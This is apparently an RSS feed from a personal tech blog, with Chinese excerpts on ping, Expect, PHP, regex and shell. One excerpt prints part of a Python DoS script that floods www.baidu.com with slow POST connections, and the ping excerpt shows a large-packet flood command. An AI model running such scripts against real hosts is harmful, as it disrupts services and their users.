<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts on My Site</title>
    <link>https://h-zeus.github.io/posts/</link>
    <description>Recent content in Posts on My Site</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Tue, 12 May 2020 10:45:53 +0800</lastBuildDate>
    
	<atom:link href="https://h-zeus.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>Ping 命令基本使用</title>
      <link>https://h-zeus.github.io/posts/ping-%E5%91%BD%E4%BB%A4%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</link>
      <pubDate>Tue, 12 May 2020 10:45:53 +0800</pubDate>
      
      <guid>https://h-zeus.github.io/posts/ping-%E5%91%BD%E4%BB%A4%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</guid>
      <description>此文章为 Windows 系统下的 cmd，在 Linux/Mac 上可能存在差异 一、ping 基本使用详解 在网络中ping是一个十分强大的TCP/IP工具。它的作用主要为：
1.用来检测网络的连通情况和分析网络速度
2.根据域名得到服务器IP
3.根据ping返回的TTL值来判断对方所使用的操作系统及数据包经过路由器数量
我们通常会用它来直接ping ip地址，来测试网络的连通情况 类如这种，直接ping ip地址或网关，ping通会显示出以上数据，有朋友可能会问，bytes=32；time&amp;lt;1ms；TTL=128 这些是什么意思。
bytes：数据包大小，也就是字节 time：响应时间，这个时间越小，说明你连接这个地址速度越快 ttl：Time To Live,表示DNS记录在DNS服务器上存在的时间，它是IP协议包的一个值，告诉路由器该数据包何时需要被丢弃。可以通过Ping返回的TTL值大小，粗略地判断目标系统类型是Windows系列还是UNIX/Linux系列  默认情况下各系统 TTL 值
Linux =&amp;gt; 64或255
WindowsNT/2000/XP =&amp;gt; 128
Windows98 =&amp;gt; 32
UNIX =&amp;gt; 255
因此一般TTL值：
100~130ms之间，Windows系统
240~255ms之间，UNIX/Linux系统
 ping命令除了直接ping网络的ip地址，验证网络畅通和速度之外，它还有这些用法 二、ping -t 的使用 不间断地 Ping 指定计算机，直到管理员中断。
这就说明电脑连接路由器是通的，网络效果很好。下面按按住键盘的Ctrl+c终止它继续ping下去，就会停止了，会总结出运行的数据包有多少，通断的有多少了。
三、ping -a 的使用 ping -a解析计算机名与NetBios名。就是可以通过ping它的ip地址，可以解析出主机名。 四、ping -n 的使用 在默认情况下，一般都只发送四个数据包，通过这个命令可以自己定义发送的个数，对衡量网络速度很有帮助，比如我想测试发送10个数据包的返回的平均时间为多少，最快时间为多少，最慢时间为多少就可以通过以下获知：
从以上我就可以知道在给47.93.187.142发送10个数据包的过程当中，返回了10个，没有丢失，这10个数据包当中返回速度最快为32ms，最慢为55ms，平均速度为37ms。说明我的网络良好。
如果对于一些不好的网络，比如监控系统中非常卡顿，这样测试，返回的结果可能会显示出丢失出一部分，如果丢失的比较多的话，那么就说明网络不好，可以很直观的判断出网络的情况。
五、ping -l size 的使用 ping -l size：发送size指定大小的到目标主机的数据包。
在默认的情况下Windows的ping发送的数据包大小为32byt，最大能发送65500byt。当一次发送的数据包大于或等于65500byt时，将可能导致接收方计算机宕机。所以微软限制了这一数值；这个参数配合其它参数以后危害非常强大，比如攻击者可以结合-t参数实施DOS攻击。（所以它具有危险性，不要轻易向别人计算机使用）。
例如：ping -l 65500 -t 211.</description>
    </item>
    
    <item>
      <title>Linux Expect 用法</title>
      <link>https://h-zeus.github.io/posts/linux-expect-%E7%94%A8%E6%B3%95/</link>
      <pubDate>Wed, 29 Apr 2020 15:56:16 +0800</pubDate>
      
      <guid>https://h-zeus.github.io/posts/linux-expect-%E7%94%A8%E6%B3%95/</guid>
      <description>起因 有两台Linux主机 需要从 A主机 ssh到B主机，然后在B主机上执行命令
起初只能像 ssh admin@10.13.14.230 &amp;quot;ls&amp;quot; 这样手动执行 每次都要输入密码
如何全程自动化呢？ 这就要用到今天这篇文章介绍的 expect 了
ps: 会 Python 请绕道~~
Expect 用来实现自动交互功能的工具
首行 #!/usr/bin/expect -f 告诉操作系统脚本里的代码使用那一个shell来执行。 这里的expect其实和linux下的bash、windows下的cmd是一类东西。 命令 1 set timeout 30 # 设置超时时间 单位:秒 [timeout -1 为永不超时] set 变量名 &amp;#34;值&amp;#34; # 设置变量 [$变量名 使用] spawn 启动新的进程 spawn ssh username@192.168.1.1 # 传递交互指令 spawn 命令用来启动新的进程，spawn后的send和expect命令都是和使用spawn打开的进程进行交互。 expect 从进程接收字符串 expect &amp;#34;password:&amp;#34; # 判断上次输出结果里是否包含“password:”的字符串 有则立即返回，否则就等待一段时间后返回，等待时长就是前面设置的30秒 expect 命令和send命令相反，expect通常用来等待一个进程的反馈，我们根据进程的反馈，再发送对应的交互命令。 send 用于向进程发送字符串 send &amp;#34;yes\r&amp;#34; # 执行交互动作 [\r 换行] send 命令接收一个字符串参数，并将该参数发送到进程。 exp_continue # 继续向下执行匹配 interact # 执行完成后保持交互状态，把控制权交给控制台 [如果没有ssh后就会退出 而不是留在远程终端上] interact 命令主要用于退出自动化，进入人工交互。 $argv 参数数组 # expect脚本可以接受从bash传递过来的参数.</description>
    </item>
    
    <item>
      <title>PHP垃圾回收机制</title>
      <link>https://h-zeus.github.io/posts/php%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/</link>
      <pubDate>Thu, 23 Apr 2020 00:00:00 +0000</pubDate>
      
      <guid>https://h-zeus.github.io/posts/php%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/</guid>
      <description>原理 利用引用计数refcount
PHP5、PHP7 的不同点  PHP5 标量数据类型会计数，PHP7 标量数据类型不再计数，不需要单独分配内存。 PHP7 的 zval 需要的内存不再是单独从堆上分配，不再自己存储引用计数。 PHP7 的复杂数据类型（比如数组和对象）的引用计数由其自身来存储。  变量在 zval 的变量容器中结构    类型     值   is_ref   refcount     is_ref 是个 bool 值，用来区分变量是否属于引用集合。 refcount 计数器，表示指向这个 zval 变量容器的变量个数。  在 PHP5.3 的GC中，针对垃圾处理做了如下说明：  如果一个 zval 的 refcount 增加，那么此 zval 还在使用，肯定不是垃圾，不会进入缓冲区。 如果一个 zval 的 refcount 减少到 0，那么此 zval 会被立即释放掉，不属于 GC 要处理的垃圾对象，不会进入缓冲区。 如果一个 zval 的 refcount 减少之后大于 0，那么此 zval 还不能被释放，此 zval 可能成为一个垃圾，将其放入缓冲区。  垃圾回收算法  对每个缓冲区中的根 zval 按照深度优先遍历算法遍历所有能遍历到的 zval，并将每个 zval 的 refcount 减 1，同时为了避免对同一 zval 多次减 1（因为可能不同的根能遍历到同一个 zval），每次对某个 zval 减 1 后就对其标记为”已减“。 再次对每个缓冲区中的根 zval 深度优先遍历，如果某个 zval 的 recount 不为 0，则对其加 1，否则保持其为 0.</description>
    </item>
    
    <item>
      <title>正则表达式</title>
      <link>https://h-zeus.github.io/posts/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</link>
      <pubDate>Fri, 17 Apr 2020 00:00:00 +0000</pubDate>
      
      <guid>https://h-zeus.github.io/posts/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</guid>
      <description>常用符号 ^ 匹配输入字符串的开始位置 + 匹配一个或多个字符（至少要有一个） $ 匹配输入字符串的结束位置 * 匹配0个或多个字符串（可以没有，也可以有） ? 最多出现一次 \ 转义 . 除换行之外的任何字符 | 指明两项之间选择一项 /^c/ =&amp;gt; 匹配&amp;#39;c&amp;#39;开头的字符串 /^cm+/ =&amp;gt; 匹配&amp;#39;cm&amp;#39;开头的字符串 /^cm+k$/ =&amp;gt; 匹配&amp;#39;cmk&amp;#39;,&amp;#39;cmmmmk&amp;#39;中间不能有其他字符 /^cm+a+b*k$/ =&amp;gt; 匹配&amp;#39;cmak&amp;#39;, &amp;#39;cmmmaaak&amp;#39;, &amp;#39;cmmmaaaabbbbk&amp;#39;等 /^cma?k$/ =&amp;gt; 匹配&amp;#39;cmak&amp;#39;或&amp;#39;cmk&amp;#39; /^cm\\+k$/ =&amp;gt; 匹配&amp;#39;cm\k&amp;#39;,&amp;#39;cm\\\k&amp;#39;等 /^cm.*k$/ =&amp;gt; 匹配&amp;#39;cm&amp;#39;开头，&amp;#39;k&amp;#39;结尾的字符串 /^cm|hk$/ =&amp;gt; 匹配&amp;#39;cmk&amp;#39;,&amp;#39;chk&amp;#39; 转义字符 \f 匹配一个换页符 \n 匹配换行符 \r 匹配回车符 \s 匹配任何空白字符，如空格，制表符，换页符等 \S 匹配任何非空白字符 \t 匹配制表符 \v 匹配垂直制表符 \d 匹配数字 \D 匹配非数字 \w 匹配下划线在内的任何单词字符：_ A-Z a-z 0-9 \b 匹配字符边界，字符与空格之间的位置 /\b[\w]+\b/ 匹配出一个单词</description>
    </item>
    
    <item>
      <title>Shell 基本语法</title>
      <link>https://h-zeus.github.io/posts/shell-%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/</link>
      <pubDate>Mon, 13 Apr 2020 00:00:00 +0000</pubDate>
      
      <guid>https://h-zeus.github.io/posts/shell-%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/</guid>
      <description>解析器标识 #!/bin/bash
数值计算 var=$((运算内容))
判断式 test 或 []
测试标志 关于文件的文件类型判断 ­e 该文件是否存在 ­f 该文件是否存在且为文件 ­d 该文件是否存在且为目录 ­b 该文件是否存在且为一个block device设备 ­c 该文件是否存在且为一个character device设备 ­S 该文件是否存在且为一个Socket文件 ­p 该文件是否存在且为一个FIFO(pipe)文件 ­L 该文件是否存在且为一个连接文件 关于文件的权限检测 root对一些文件权限无作用 ­r 检测该文件是否存在且对当前用户具有可读权限 ­w 检测该文件是否存在且对当前用户具有可写权限 ­x 检测该文件是否存在且对当前用户具有可执行权限 ­u 检测该文件是否存在且对当前用户具有SUID权限 ­g 检测该文件是否存在且对当前用户具有SGID权限 ­k 检测该文件是否存在且对当前用户具有Sticky bit权限 ­s 检测该文件是否存在且为“非空白文件” 两个文件的比较 如 test file1 ­nt file2 ­nt newer than 判断文件1是否比文件2新 ­ot older than 判断文件1是否比文件2旧 判断文件1与文件2是否为同一文件，可用在判断hard link的判定上，主要判定两个文件 -ef 判断文件1与文件2是否为同一文件，可用在判断hard link的判定上，主要判定两个文件是否指向同一个inode 关于两个整数之间的判定 test n1 ­eq n2 ­eq 两数值相等 ­ne 两数值不相等 ­gt n1 大于 n2 ­lt n1 小于 n2 ­ge n1大于等于n2 ­le n1小于等于n2 判定字符串的数据 test ­z string 判定字符串是否为0，若string为空字符串，则为true test ­n string 判断字符串是否非0，若string为空字符串，返回false，­n可以省略 test str1=str2 判断str1是否等于str2，相等回传true test str1!</description>
    </item>
    
    <item>
      <title>Dos 攻击脚本</title>
      <link>https://h-zeus.github.io/posts/dos-%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC/</link>
      <pubDate>Wed, 08 Apr 2020 00:00:00 +0000</pubDate>
      
      <guid>https://h-zeus.github.io/posts/dos-%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC/</guid>
      <description>#!/usr/bin/env python import socket import time import threading # Pressure Test,ddos tool # --------------------------- MAX_CONN = 20000 PORT = 80 HOST = &amp;#34;www.baidu.com&amp;#34; PAGE = &amp;#34;/index.php&amp;#34; # --------------------------- buf = (&amp;#34;POST %sHTTP/1.1\r\n&amp;#34; &amp;#34;Host: %s\r\n&amp;#34; &amp;#34;Content-Length: 10000000\r\n&amp;#34; &amp;#34;Cookie: dklkt_dos_test\r\n&amp;#34; &amp;#34;\r\n&amp;#34; % (PAGE, HOST)) socks = [] def conn_thread(): global socks for i in range(0, MAX_CONN): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: s.connect((HOST, PORT)) s.send(buf.encode()) print(&amp;#34;Send buf OK!,conn=%d\n&amp;#34; % i) socks.append(s) except Exception as ex: print(&amp;#34;Could not connect to server or send error:%s&amp;#34; % ex) time.</description>
    </item>
    
    <item>
      <title>Mac/Windows Soft</title>
      <link>https://h-zeus.github.io/posts/%E8%BD%AF%E4%BB%B6%E6%8E%A8%E8%8D%90/</link>
      <pubDate>Wed, 08 Apr 2020 00:00:00 +0000</pubDate>
      
      <guid>https://h-zeus.github.io/posts/%E8%BD%AF%E4%BB%B6%E6%8E%A8%E8%8D%90/</guid>
      <description>其他  Enpass 密码管理工具 Joplin 笔记软件（搭配坚果云可实现同步功能） 网易云音乐 音乐 WPS Office 办公套件 自动切换输入法 如名 pap.er 壁纸软件 超级右键 还原 Windows 右键菜单 Alfred 4 必备软件 自动化操作 eZip 解压缩软件 iCHM .CHM 查看器 BetterTouchTool 自动化操作 Google Chrome 谷歌浏览器（选择性安装）  编程  Postman 接口测试工具 Navicat Premium 多版本数据库 Hyper 自定义终端 Sublime Text 编辑器（代替文本编辑器） PhpStorm PHP 编辑器 PyCharm Python 编辑器 Xcode 编译编辑器 网易有道词典 翻译软件 VirtualBox 虚拟机（建议安装 Vagrant配合 .box使用） Typora MarkDown编辑器 Charles 抓包工具 MAMP 开发环境集成 SwitchHosts 管理 Hosts diffmerge 文件差异对比  Windows  Camtasia 9 视频剪辑、录屏软件 Fiddler 抓包工具 Adobe Audition 音频编辑软件 冰点文库 各大文库下载 FSCapture 截屏软件  </description>
    </item>
    
    <item>
      <title>PHP获取二维数组中某一列的值集合</title>
      <link>https://h-zeus.github.io/posts/php%E8%8E%B7%E5%8F%96%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84%E4%B8%AD%E6%9F%90%E4%B8%80%E5%88%97%E7%9A%84%E5%80%BC%E9%9B%86%E5%90%88/</link>
      <pubDate>Wed, 08 Apr 2020 00:00:00 +0000</pubDate>
      
      <guid>https://h-zeus.github.io/posts/php%E8%8E%B7%E5%8F%96%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84%E4%B8%AD%E6%9F%90%E4%B8%80%E5%88%97%E7%9A%84%E5%80%BC%E9%9B%86%E5%90%88/</guid>
      <description>PHP还是比较常用的，于是我研究了一下PHP二维数组。在处理php数组的时候，有一种需求特别的频繁，如下二维数组：
$arr = array( 1=&amp;gt;array( &amp;#39;id&amp;#39; =&amp;gt; 5, &amp;#39;name&amp;#39; =&amp;gt; &amp;#39;张三&amp;#39; ), 2=&amp;gt;array( &amp;#39;id&amp;#39; =&amp;gt; 6, &amp;#39;name&amp;#39; =&amp;gt; &amp;#39;李四&amp;#39; ) ); 目的就是要取到key为name的集合，得到这个结果：
$arr2 = array( 0=&amp;gt;&amp;#39;张三&amp;#39;, 1=&amp;gt;&amp;#39;李四&amp;#39; ); 这里有几种方法： 1：最简单的，foreach遍历数组：
foreach ($arr as $key =&amp;gt; $value) { $arr2[] = $value[&amp;#39;name&amp;#39;]; } 2：代码量稍微少一点的代码，使用了 array_map 这个php方法：
$arr2 = array_map(&amp;#39;array_shift&amp;#39;,$arr); 意为把$arr数组的每一项值的开头的值移出，并返回被移出的每一项值中被移出的值，注意此时新数组$arr2的键仍是原数组$arr的键
2.1：在方法2的基础上，可以稍微开一下脑洞，如果需要获取的是二维数组的每一项的开头列或结尾列，也可以这样做：
$arr2 = array_map(&amp;#39;reset&amp;#39;,$arr); $arr2 = array_map(&amp;#39;end&amp;#39;,$arr); 3：还可以使用 array_reduce 方法，不过代码略多，不过这个方法的想象空间（针对别的数组取值操作）还是蛮大的：
$arr2 = array_reduce($arr, create_function(&amp;#39;$result, $v&amp;#39;, &amp;#39;$result[] = $v[&amp;#34;name&amp;#34;];return $result;&amp;#39;)); array_reduce方法用回调函数迭代地将对数组的值进行操作，而create_function用于一个匿名方法做回调用，这个匿名方法的参数$result为上一次迭代产生的值，$v是当前的值，内部实现既为获取到数组$arr每一项的”name”的值并push到新$result数组;
4：最后这个终极方法实在是太爽了，一个方法就搞定，而且非常灵活：
$arr2 = array_column($arr, &amp;#39;name&amp;#39;); 第二个参数为想要获取的那一列的键名，是不是很方便呢，不过这个方法有个限制，就是php版本必须 &amp;gt;= 5.</description>
    </item>
    
  </channel>
</rss>